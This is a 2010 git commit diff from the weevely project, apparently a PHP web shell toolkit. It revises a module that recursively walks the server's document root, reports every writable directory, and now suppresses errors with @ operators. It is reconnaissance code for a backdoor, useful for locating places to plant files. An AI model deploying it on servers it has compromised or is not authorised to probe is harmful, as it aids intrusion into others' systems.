60091d654f048acc0b5322e779299643dd207a6d
sattacarlo <sattacarlo@5205769a-2ae6-11df-b744-258d51847b74>
2010-03-10 22:53:40 +0000

    Gestione Moduli
    git-svn-id: http://weevely.googlecode.com/svn/trunk@41 5205769a-2ae6-11df-b744-258d51847b74

--- modules/search_writable_path.php
+++ modules/search_writable_path.php
@@ -1,15 +1,14 @@
 //Author:  Carlo Satta
 //Description: Print all writable directories.
-c($_SERVER['DOCUMENT_ROOT']);
-function c($d){
-	echo $d."\n";
-	$h = opendir($d);
-	while ($f = readdir($h)) {
+@swp($_SERVER['DOCUMENT_ROOT']);
+function swp($d){
+	$h = @opendir($d);
+	while ($f = @readdir($h)) {
 		$df=$d.'/'.$f; 
-		if((is_dir($df))&&($f!='.')&&($f!='..')){
-			if(is_writable($df)) echo "Writable: ".str_replace($_SERVER['DOCUMENT_ROOT'],'',$df)."\n";
-			c($df);
+		if((@is_dir($df))&&($f!='.')&&($f!='..')){
+			if(@is_writable($df)) echo "Writable: ".@str_replace($_SERVER['DOCUMENT_ROOT'],'',$df)."\n";
+			@swp($df);
 		}
 	}
-	closedir($h);
+	@closedir($h);
 }
